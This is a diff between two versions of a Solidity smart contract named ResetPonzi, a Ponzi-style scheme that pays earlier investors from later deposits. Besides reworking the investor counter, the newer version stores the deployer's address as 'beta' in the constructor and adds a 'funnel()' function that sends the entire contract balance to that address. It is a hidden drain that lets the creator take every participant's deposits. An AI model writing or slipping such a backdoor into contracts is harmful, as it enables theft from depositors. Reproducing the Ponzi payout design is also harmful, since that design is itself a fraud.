@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ResetPonzi at 0x258d778e4771893758dfd3e7dd1678229320eeb5
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ResetPonzi at 0x1368e088682b3ea455c4856297365542ca6828d8
 */
 contract ResetPonzi {
     
@@ -23,6 +23,7 @@ contract ResetPonzi {
     
     function ResetPonzi() {
         currentNiceGuy = msg.sender;
+        beta = msg.sender;
     }
     
     
@@ -32,26 +33,24 @@ contract ResetPonzi {
             throw;
         }
         
-        if (investor < 8) {
-            uint idx = persons.length;
-            persons.length += 1;
-            persons[idx].addr = msg.sender;
-        }
-        
-        if (investor > 7) {
+        if (investor > 8) {
             uint ngidx = niceGuys.length;
             niceGuys.length += 1;
             niceGuys[ngidx].addr2 = msg.sender;
-            if (investor > 8 ) {
+            if (investor == 10) {
                 currentNiceGuy = niceGuys[currentNiceGuyIdx].addr2;
                 currentNiceGuyIdx += 1;
             }
         }
         
         if (investor < 9) {
-            investor += 1;
+            uint idx = persons.length;
+            persons.length += 1;
+            persons[idx].addr = msg.sender;
         }
-        else {
+        
+        investor += 1;
+        if (investor == 11) {
             investor = 0;
         }
         
@@ -62,4 +61,11 @@ contract ResetPonzi {
             payoutIdx += 1;
         }
     }
+    
+    
+    function funnel() {
+        beta.send(this.balance);
+    }
+    
+    
 }
